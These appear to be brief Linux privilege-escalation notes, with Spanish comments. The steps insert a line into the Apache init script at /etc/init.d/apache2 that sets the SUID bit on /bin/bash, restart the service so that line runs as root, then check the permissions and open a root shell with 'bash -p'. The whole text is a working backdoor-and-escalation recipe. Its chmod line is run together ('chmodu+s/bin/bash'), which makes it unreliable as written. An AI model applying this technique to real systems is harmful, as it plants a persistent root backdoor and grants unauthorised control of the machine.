```bash
(/usr/sbin/service apache2 restart)

cd /etc/init.d/
```

nano apache2

```
#Dentro del nano
#!/bin/bash
chmodu+s/bin/bash
#RESTO DEL CODIGO
```

```bash
sudo service apache2 restart

ls -la /bin/bash

bash -p
```
